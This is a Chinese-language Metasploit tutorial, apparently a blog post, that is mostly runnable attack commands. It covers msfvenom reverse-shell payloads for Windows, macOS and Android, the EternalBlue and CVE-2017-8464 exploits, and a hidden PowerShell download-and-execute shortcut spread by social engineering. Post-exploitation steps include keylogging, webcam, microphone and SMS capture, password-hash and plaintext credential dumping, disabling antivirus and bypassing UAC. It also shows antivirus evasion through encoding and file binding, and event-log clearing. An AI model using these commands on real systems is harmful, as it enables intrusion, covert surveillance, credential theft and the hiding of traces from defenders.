---
icon: edit
date: 2023-04-30
category:
  - 内网渗透
tag:
  - 内网
  - 工具
star: true
sticky: true
---

# Metasploit 基础入门

## msf 发展历史

> msf 全称 metasploit framework，是H.D. Moore、Spoonm 等4人开发的一个开源的漏洞框架。

> msf 具有良好的可扩展性，它的控制接口负责发现漏洞、攻击漏洞、提交漏洞，然后通过一些接口加入攻击后处理工具和报表工具。 msf 可以从一个漏洞扫描程序导入数据，使用关于有漏洞主机的详细信息来发现可攻击漏洞，然后使用有效载荷对系统发起攻击，有效载荷就是在发现漏洞之后开发一种可行的攻击方法。其用于提取本地系统密码、安全其他软件或控制硬件等模块。

> 2003 年， metasploit 正式发布。
>
> 2004 年，metasploit 在拉斯维加斯世界黑客交流会（黑客简报）上出尽了风头，首次面世就挤进安全工具 15 强，引起了美国国防部和国家安全局等众多政府机构和个人的强烈关注，在安全界引发了强烈的地震。
>
> 2005 年，西雅图微软总公司管理情报中心的蓝帽会议中，msf 的演示让微软的开发人员再次感到不安。
>
> 2007 年，由于 perl 语言的一些缺陷，开发人员使用 ruby 语言重写了 msf。
>
> 2008 年，msf 采用新的三段式 BSD 许可证（BSD 是一种开源软件许可证，它给予使用者很大自由的协议，可以自由的使用、修改源代码，也可以将修改后的代码作为开源或者专有软件再发布）。
>
> 2009 年，漏洞管理解决公司 Rapid7 收购了 msf 项目，承诺成立专职开发团队，并继续使用三段式 BSD 许可证。





## Linux 安装 msf



- 拉取 `msf` 安装脚本

​		`curl https://raw.githubusercontent.com/rapid7/metersploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall`

- 对安装脚本赋权并执行

  `chmod 755` msfinstall && ./msfinstall




## Kali 更新 msf



- Kali 官网

​	`https://www.kali.org/get-kali/#kali-installer-images`

- 添加更新源

  - `cd /etc/apt`

  - `vi sourcelist`

  - ```
    deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
    deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
    # 阿里云 kali 更新源
    deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
    deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
    #163 DEBIAN 源
    deb http://mirrors.163.com/debian wheezy main non-free contrib
    deb-src http://mirrors.163.com/debian wheezy main non-free contrib
    deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
    deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib
    deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib
    ```

  - `apt-get update`

  - `apt-get install metasploit-framework`

- 如果遇到 `update 无效` 的错误

  - ```
    wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add
    apt-get clean
    apt-get update
    ```





## Windows 安装 msf



- 下载 msf
  - `https://metasploit.com/download`
- 安装并配置环境变量
- 执行
  - `msfconsole`





##  msf 的图形化界面 viper



> Viper 是一款图形化内网渗透工具，集成杀软绕过、内网隧道、文件管理、命令行等基础功能。目前已集成 70+ 个模块，覆盖初始访问、持久化、权限提升、防御绕过、凭证访问、信息收集、横向移动等多个大类。





### Kali 上通过 Docker 安装 viper

#### 安装 Docker

- `apt-get update`
- `apt-get install -y docker.io`
- `systemctl start docker`
- `docker version`

#### 安装 Docker Compose

- ```curl -L https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` > /usr/bin/docker-compose```

- `chmod +x /user/bin/docker-compose`

- `export VIPER_DIR=/root/VIPER`

- `mkdir -p $VIPER_DIR && cd $VIPER_DIR`

- ```
  tee docker-compose.yml <<- 'EOF'
  version: "3"
  services:
  	viper:
  		image: registry.cn-shenzhen.aliyuncs.com/toys/viper:latest
  		container_name: viper-c
  		network_mode: "host"
  		restart: always
  		volumes:
  			- ${PWD}/loot:/root/.msf4/loot
  			- ${PWD}/db:/root/viper/Docker/db
  			- ${PWD}/module:/root/viper/Docker/module
  			- ${PWD}/log:/root/viper/Docker/log
  			- ${PWD}/nginxconfig:/root/viper/Docker/nginxconfig
  		command:["VIPER_PASSWORD"]
  EOF
  ```

- `export VIPER_PASSWORD=root`

- `sed -i "s/VIPER_PASSWORD/$VIPER_PASSWORD/g" docker-compose.yml`

- `cat docker-compose.yml`

- `cd $VIPER_DIR`

- `docker-compose up -d`

- `docker-compose start`

- `https://ip:60000` 登录，用户名默认 `root`





## msf 的目录结构

- `modules`
  - `auxiliary` ：辅助模块（端口扫描、密码爆破、漏洞验证等）
  - `encoders` ： 编码器
  - `evasion`： 躲避模块（绕过杀软）
  - `exploits`： 漏洞利用
  - `nops`：payloads 生成时用到
  - `payloads`：攻击载荷
  - `post`：后渗透模块（渗透成功后对目标机器发送指令）
- `plugins`：插件。使用时需要单独加载
- `tools`： 工具集
- `scripts` ： 利用脚本
- `data`： 存放数据的文件（例如字典）
- `config`： 配置文件
- `db`： 数据库文件
- `lib`： 库文件



# msf 核心功能



## msf 核心模块与功能

> 上面目录结构中都已经标出，使用 `search` 命令可以查看这些模块

- `search auxiliary`
- `search exploits`
- `search payloads`
- `search post`
- `search encoders`
- `search evasion`



## msfvenom 介绍

> 在 Kali 中，`msfvenom` 取代了 `msfpayload` 和 `msfencode`，常用于生成后门木马

#### msfvenom 常用参数

- `-l`：列出指定模块的所有可用资源。模块类型包括（`payloads`、`encoders`、`nops`、`all`）
- `-p`：指定需要使用的 `payload`
- `-f`：指定输出的格式
- `-e`：指定需要使用的 `encoder`编码免杀
- `-a`：指定 `payload` 的目录架构
- `-o`：保存 `payload` 文件输出
- `-b`：设定规避字符集
- `-n`：为 `payload` 预先指定一个 `NOP` 滑动长度
- `-s`：设定有效攻击载荷的最大长度，也就是文件大小
- `-i`：指定 `payload` 的编码次数
- `-c`：指定一个附加的 `win32 shellcode` 文件
- `-x`：指定一个自定义的可执行文件作为模板（捆绑程序）
- `-k`：保护模板程序的动作（捆绑程序）
- `-v`：指定一个自定义变量以确定输出格式

#### Windows 平台生成 `payload` 命令

```shell
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -e x86/shikata_ga_nai -b "\x00\x0a\xff" -i 10 -f exe -o payload.exe
```

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxxx -f exe > payload.exe
```



#### Mac 平台生成 `payload` 命令

````shell
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -f macho -o payload.macho
````

#### Android 平台生成 `payload` 命令（需要签名）

```shell
msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx -f apk -o payload.apk
```

```shell
msfvenom -p android/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=xxxx R>payload.apk
```



## msfconsole 漏洞利用流程

1. 前期交互

   与客户组织进行讨论，确定目标范围。

2. 信息收集

   外围搜索、主机探测、端口扫描、服务扫描、网络漏洞扫描、脚本扫描等

   1. 基于 `msf` 发现内网存活主机
      - `search scanner type:auxiliary` 查看可用的发现主机模块
        - `auxiliary/scanner/discovery/arp_sweep` 基于 ARP 发现内网存活主机
        - `auxiliary/scanner/sidcovery/udp_sweep` 基于 UDP 发现内网存活主机
        - `auxiliary/scanner/ftp/ftp_version` 发现 FTP 服务
        - `auxiliary/scanner/http/http_version` 发现 HTTP 服务
        - `auxiliary/scanner/smb/smb_version` 基于 smb 发现内网存活主机
        - ....
      - `use auxiliary/scanner/discovery/arp_sweep` 使用指定的发现主机模块
      - `options` 查看模块需要配置的参数
      - `set rhost 192.168.xxx.xxx/24` 配置 `rhost` 参数
      - `run` 运行

3. 威胁建模

   确定可行的漏洞利用通道。主要是整理根据收集到的情报，理清漏洞利用思路

4. 漏洞分析

   整理可用资源，挑选匹配的漏洞利用模块、shellcode 等

   1. 比如：如果探测到开放了 445 端口，就可以尝试选择永恒之蓝、永恒之蓝2、MS08-067 等

5. 渗透利用

   尝试利用漏洞，配置监控等

   1. 以木马+社工为例。利用 `msfvenom` 模块生成木马。
   2. 利用社工诱导目标机下载木马程序（链接、二维码、邮件、附件等），在 kali 中可以使用 `python -m SimpleHTTPServer` 或 `python -m http.server 80` 快捷启动一个 web 服务以便于测试目标机下载木马程序（多个版本的 python 时记得指定 python2 或者 python3）
   3. Kali 配置监听
      - `use exploit/multi/handler`
      - `options`
      - `set lport xxxx`
      - `set lhost 192.168.xxx.xxx`
      - `set payload windows/meterpreter/reverse_tcp`
      - `run` 或者 `exploit` 运行
   4. 等待目标机木马程序执行

6. 后渗透利用

   实施渗透后的操作，数据获取、后门维持、提权、脱库等

   1. 主要使用 meterpreter 模块

7. 渗透报告

   整理渗透测试报告

## meterpereter 功能介绍（后渗透）

> meterpreter 是 msf 中的一个利器，作为漏洞溢出后的攻击载荷使用，攻击载荷在触发漏洞后会返回一个由我们控制的通道，可用于远程命令执行。
>
> meterpreter 提供了各个主流平台的 meterpreter 版本，另外还提供了基于 php 和 java 语言的实现，并且还支持 ruby 脚本形式的扩展。
>
> meterpreter 的工作模式是纯内存的，启动隐藏，很难被杀软监测到。它本身不需要访问目标主机磁盘，因此也基本不会留下入侵痕迹

#### meterpreter 常用的反弹类型

1. `reverse_tcp` 基于 TCP 的反弹连接，最常用且稳定的反弹类型

#### meterpreter 的常用命令

1. 基本命令
   - `help` 
   - `background` 返回，挂起，会返回 session id，可以使用 `sessions` 命令唤醒
   - `bgkill` 杀死指定后台 meterpreter 脚本
   - `bglist` 列出所有正在运行的后台脚本
   - `bgrun` 作为一个后台线程运行脚本
   - `channel` 显示活动频道
   - `sessions -i number` 与指定第number个会话进行交互。常用的还有 `-k` 参数
   - `close` 关闭通道
   - `exit` 终止会话
   - `quit` 终止会话
   - `interact id` 切换信道
   - `run` 执行已有模块。按两下 `tab` 会列出所有已有脚本
2. 常用命令（安卓）
   - `dump_contacts` 获取手机通讯录
   - `dump_sms` 获取短信记录
   - `send_sms -d 188xxxxxxxx -t "message"` 发送指定内容的短信到指定手机号
   - `geolocate` 获取 GPS 定位
   - `wlan_geolocate` 获取 Wi-Fi 定位信息
   - `record_mis -d 60` 录音
   - `webcam_list` 获取相机设备
   - `webcam_snap` 拍照
   - `webcam_stream` 开启摄像头实时直播

3. 常用命令（Windows）
   - `ps` 查看进程
   - `getpid` 查看进程号
   - `sysinfo` 查看系统信息
   - `run post/windows/gather/checkvm` 查看目标是否虚拟机
   - `route` 查看完整网络设置
   - `getuid` 查看当前权限
   - `getsystem` 自动提权
   - `run post/windows/manage/killav` 关闭杀软
   - `run post/windows/manage/enable_rdp` 启动远程桌面协议
   - `run post/windows/gather/enum_logged_on_users` 列举当前登录用户
   - `run post/windows/gather/enum_applications` 列举当前应用程序
   - `load espia; screengrab` 抓取屏幕截图
   - `webcam_snap` 摄像头拍照
   - `pwd` 查看当前所在目录
   - `getlwd` 查看当前目录
   - `run hashdump` 导出当前用户密码哈希
   - `run windows/gather/smart_hashdump` 导出当前用户密码哈希
   - `run windows/gather/credentials/windows_autologin` 抓取自动登录的用户名和密码
   - `shell` 进入 windows 的 shell（ Windows 和 Linux 的编码不一致，可能会出现中文乱码）
   - `chcp 65001` 修改控制台编码
   - ...



## php 后门反弹连接



## CVE-2017-0144 永恒之蓝

#### CVE-2017-0144

1. 什么是 CVE-2017-0144

   > CVE-2017-0144 是大名鼎鼎的永恒之蓝漏洞的编号。最早爆发于 2017 年 4 月 14 日晚，利用 Windows 系统的 SMB 协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。2017 年 5 月 12 日，永恒之蓝经过改造，被制作成了勒索病毒，使全世界大范围遭受病毒勒索，波及到大型企业、政府甚至高校，只能通过支付高额赎金才能恢复文件。

2. 什么是 SMB 协议

   > SMB 是一个协议服务信息快，它是一种客户机-服务器、请求-响应的协议，通过 SMB 可以在计算机之间共享文件、打印机、命名管道等资源，电脑上的网上邻居就是通过 SMB 实现的，SMB 协议工作在应用层和会话层，可以用在 TCP/IP 协议上，SMB 使用的是 TCP 139 端口和 TCP 445 端口。

3. SMB 的工作原理

   > 首先，客户端发送一个 SMB negport 请求数据包，并列出它所支持的所有 SMB 的协议版本。
   >
   > 服务器收到请求消息后响应请求，并列出希望使用的 SMB 协议版本（如果没有可使用的 SMB 协议版本则返回 0XFFFFH，结束通信）。
   >
   > 协议确定后，客户端进行向服务器发起一个用户或共享认证（通过发送 SessetupX 请求数据包实现）。
   >
   > 客户端发送一对用户名和密码或者一个简单的密码到服务器，服务器通过 SessetupX 应答数据包来允许或拒绝本次连接。
   >
   > 客户端和服务器完成了磋商和认证之后，发送 Tcon 或 TconX SMB 数据包并列出它想访问的网络资源名称，之后发送 TconX 应答数据包表示接受或拒绝此次连接。
   >
   > 连接到相应资源后，SMB 客户端就能通过 open SMB 打开一个文件，通过 read SMB 读取文件，通过 write SMB 写入文件，通过 close SMB 关闭文件等。

4. 永恒之蓝色的原理

   > 永恒之蓝是在 windows 的 SMB 服务处理 SMB v1 请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。
   >
   > 通过永恒之蓝漏洞会扫描开放的 445 文件共享端口和 windows 机器，无需用户任何操作，只要开机联网，就可以在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿等恶意程序。

#### 环境准备

- Windows 7 系统
  - 防火墙处于关闭状态
  - SMB 协议处于开启状态（网络和共享中心-高级共享中心-启用文件和打印机共享）
- metasploit 平台

#### 利用复现

1. 启动 metasploit 终端

   `msfconsole`

2. 查询可利用模块

   `search ms17_010`

3. 使用探测模块（探测指定范围内复合 ms17-010 利用条件的主机）

   `use auxiliary/scanner/smb/smb_ms17-010`

4. 设置探测范围

   `show options`

   `set rhosts 192.168.xxx.aaa-192.168.xxx.bbb`

   `run`

5. 漏洞利用

   `search ms17_010`

   `use exploit/windows/smb/ms17_010_eternalblue`

   `show options`

   `set rhost 192.168.xxx.xxx`

   `run`

6. 后渗透

   meterpreter 模块



## CVE-2017-8464 震网三代

#### CVE-2017-8464

> 2017 年 6 月 13 日，微软官方发布编号为 CVE-2017-8464 的漏洞公告，官方介绍 Windows 系统在解析快捷方式时存在远程执行任务代码的高危漏洞，黑客可以通过 U 盘、网络共享等途径触发漏洞，完全控制用户系统。
>
> 传播载体一般是 LNK，LNK 是 Windows 系统内应用程序快捷方式文件的后缀名
>
> 被攻击机插入存在攻击 lnk 的 U 盘会反弹 shell，即使是被隔离的内网，也可以在不联网的情况下被攻击。

#### 利用原理

> 创建恶意快捷方式，包含执行脚本，点击快捷方式，导致目标机中招

#### 环境准备

- Windows 7/8.1/10系统或 Windows Server 2008/2012/2016
- Kali

#### 利用复现

1. msf 生成后门程序

   ```shell
   msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.xxx.xxx lport=xxxx -f psh-reflection>/var/www/html/link.ps1
   ```

2. 开启 kali 的 http 服务，供外链访问到后门程序

   `service apache2 start`

3. 在 windows 主机上创建一个快捷方式，值如下：

   ```shell
   powershell -windowstyle hidden -exec bypass -c "IEX(New-ObjectNet.WebClient).DownloadString('http://kali-ip/link.ps1');test.ps1"
   ```

4. 打开 msf 终端，配置监听

   `msfconsole`

   `use exploit/multi/handler`

5. 配置 payload

   `set payload windows/x64/meterpreter/reverse_tcp`

   `show options`

   `set lhost 192.168.xxx.xxx`

   `set lport xxxx`

   `run`

6. 利用社会工程学，传播第 3 步中创建的快捷方式，诱导点击执行，获得反弹shell



## CVE-2020-0796 永恒之黑

#### CVE-2020-0796

> 2020 年 3 月 10 日，国外安全厂商发布安全通告添加 CVE-2020-0796 对应 IPS 规则，描述中认为该漏洞可导致无需认证的远程任意代码执行。
>
> 3 月 11 日微软例行更新，但其中并未发布 CVE-2020-0796 的漏洞资料。
>
> 次日（3 月 12 日）晚，微软正式发布 CVE-2020-0796 高危漏洞补丁。

#### 利用原理

> Windows 驱动 srv2.sys 中，使用了 SMB 3.1.1 版本增加了对压缩数据的支持，但 SMB 3.1.1 协议中处理压缩消息时，未对数据进行安全性检查而直接使用，攻击者利用这个漏洞无需权限即可实现远程代码执行。

#### 环境准备

- Windows 10 Version 1903/1909
- 攻击机 python 环境





## 生成木马反弹 shell （Windows）



## 生成木马反弹 shell （Linux）



## 生成木马反弹 shell （Android）



# msf 后渗透



## 后渗透之访问文件系统

- `help`
- `ls` 或 `dir` 查看靶机目录
- `lls` 查看攻击机的目录
- `getwd` 查看靶机当前所处目录
- `getlwd` 查看攻击机当前所处目录
- `mkdir filename`
- `rmdir filename`
- `cd`
- `edit filename`
- `cat filename`
- ...

## 后渗透之上传下载文件

- `upload xxxx.exe`
- `download xxxx.zip`

## 后渗透之屏幕截图

- `screenshot`

## 后渗透之键盘记录

- `keyscan_start`
- `keyscan_dump`
- `keyscan_stop`

## 后渗透之创建账号

- `run post/windows/gather/enum_logged_on_users`
- `run getgui -u username -p password`

## 后渗透之音频录制

- `record_mic -d 60`  持续时间 30 秒（参数是实际时间的 2 倍）
- `record_mic -p` 自动播放

## 后渗透之提权

- `getuid` 查看当前权限。只有 SYSTEM 才可以创建账号

#### 提权方法一：

- `getsystem` 直接提权

#### 提权方法二：

- ` getuid` 获取当前用户
- `bg`  将当前 Session 挂起，会返回一个 Session id
- `use exploit/windows/local/ask`    USA 绕过提权，使用 ASK 模块
- `show options` 查看需要配置的参数
- `set session x`  配置 session id，刚才挂起的 session
- `set filename`  可以不配置，如果配置，会伪装成这个文件，如 QQ.exe
- `run`  运行

#### 提权方法三：

- `getui` 获取当前用户
- `bg` 将当前 Session 挂起
- `search bypassuac` 搜索提权模块
- `use exploit/windows/local/bypassuac_dotnet_profiler` 选择要使用的模块（以 dotnet 模块为例）
- `options` 查看需要配置的参数
- `sessions` 查看 session （如果记得挂起的 id ，可以跳过这一步）
- `set session x` 配置 session id
-  `set lhost xxx.xxx.xxx.xxx`
- `set lport xxxx`
- `getuid` 查看当前用户（还是最开始的用户）
- `getsystem` 提权
- `getuid` 查看当前用户（SYSTEM 用户）



## 后渗透之获取登录密码

> 以下操作前提是已经提权到 SYSTEM

#### 抓取自动登录账号密码

- `run windows/gather/credentials/windows_autologin`

#### 导出 SAM 数据库本地账户密码文件

- `run post/windows/gather/smart_hashdump`
  - 返回结果包含四列：用户名、SID、LM哈希、NTLM哈希（可用MD5解密）

#### 导出密码哈希

- `run hashdump`

#### 使用 kiwi 模块获取

- `load kiwi` 加载 kiwi 模块
- `creds_all` 直接获取密码
- `kiwi_cmd sekurlsa::logonpasswords` 直接获取密码

## 后渗透之远程监控

#### rdesktop 远控

> rdesktop 是 linux 下支持 windows 远程桌面连接的客户端程序，在 linux 系统下可以通过它远程访问 windows 桌面
>
> rdesktop 是 SourceForge 下支持的 GPL 协议开源项目，采用 RDP （远程桌面协议），几乎可以连接 windows 的所有版本

1. 安装 rdesktop
   - `apt-get install rdesktop`
   - `yum -y install rdesktop`
2. 远程控制
   - `rdesktop -u username -p password -g 1920x1080 192.168.xxx.xxx`
     - `-h`  帮助文档
     - `-u`  用户名
     - `-p`  密码
     - `-a 16`  使用 16 位色显示
     - `-f`  全屏模式（ctrl+alt+enter 退出全屏）
     - `-g 1027x768` 设置分辨率
   - `run post/windows/manage/enable_rdp` 如果远程计算机没有开放远程功能，可以在 meterpreter 中启动远程协议

#### vnc 远控

1. 直接运行

   `run vnc`

## 后渗透之摄像头监控

- `webcam_list`  列出所有软硬件摄像头列表
- `webcam_snap`  调用单个摄像头拍照，默认调用编号为 1 的摄像头
- `webcam_stream`  调用单个摄像头直播，默认调用编号为 1 的摄像头



# msf 进阶



## msf Auxiliary 辅助模块

`use auxiliary/` 或者 `show auxiliay` 命令查看所有辅助模块。

目前主要分以下几大类：

#### admin

---

- `/admin/andriod`
- `/admin/http/`
- `/admin/mysql/`
- `/admin/oracle/`
- `/admin/vmware/`
- `/admin/smb`

#### dos

---

- `/dos/android/`
- `/dos/http/`
- `/dos/cisco/`
- `/dos/dns/`
- `/dos/smb/`
- `/dos/windows/ftp`

#### fuzzers

---

- `/fuzzers/http/`
- `/fuzzers/smb`
- `/gather/`

#### scanner

---

- `/scanner/portscan/`
- `/scanner/ftp/`
- `/scanner/http/`
- `scanner/ssh/`
- `/scanner/smb/`
- `/scanner/vmware`
- `/scanner/vnc/`
- `/scanner/telnet/`
- `/scanner/mysql/`
- `/scanner/openvas/`
- `/scanner/sap/`

#### server

---

- `/server/`

#### 其他

---

- `whois ip` 查询 ip 相关信息
-  `use auxiliary/gather/search_email_conllector`  查找邮箱
- `use auxiliary/gather/enum_dns`  DNS 枚举
- `use auxiliary/scanner/ssh/ssh_login`  SSH 爆破

也可以通过分类查询指定模块

`search type:auxiliary name:smb`

## msf 免杀

1. 杀软是如何检测恶意代码的？

   > 特征码和启发式恶意行为。

2. 免杀是什么？

   > 对特征码进行混淆，打乱代码，避免杀软查杀

3. 免杀的基本方式有哪些？

   > 自编码处理、自捆绑+编码、多重编码、接口下载、签名伪装



### 在线查毒

`https://www.virscan.org`



### 免杀处理

##### 一、不额外处理直接生成样本

`msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxx -f exe -o payload.exe`

查杀结果： 41% 的杀软报毒



##### 二、MSF 自编码处理生成样本（-e）

`msfvenom --list encoders` 查看可用的编码模块

`msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai lhost=xxx.xxx.xxx.xxx lport=xxx -f exe -o payload.exe`

查杀结果： 37% 的杀软报毒

##### 三、MSF 自捆绑处理生成样本（-x）

`msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxx -x AAA.exe -f exe -o payload.exe`

查杀结果： 37% 的杀软报毒

##### 四、MSF 自捆绑+编码处理生成样本（-e、 -x、 -i）

`msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxx -e x86/shikata_ga_nai -x AAA.exe -i 10 -f exe -o payload.exe`

查杀结果： 31% 的杀软报毒

增加编码次数 `-i 20`

查杀结果： 27% 的杀软报毒

##### 五、MSF 多重编码生成样本

`msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxx -e x86/shikata_ga_nai -x AAA.exe -i 10 -f raw | msfvenos -e x86/alpha_upper -i 10 raw | msfvenom -e x86/countdown -i 10 -x AAAA.exe -f exe -o payload.exe`

##### 六、生成 ShellCode 使用 C 语言调用

1. 在 linux 中利用 msf 的 meterpreter 生成的文件以 .c 形式文件存储，得到机器码：

   `msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxxx -f c > c0001.c`

2. 修改 c 文件，编译，加壳



## msf 清除事件日志

- 在 meterpreter 中执行 clearev 命令直接清理（包含应用程序、系统日志、安全模块日志。需要 SYSTEM 权限）

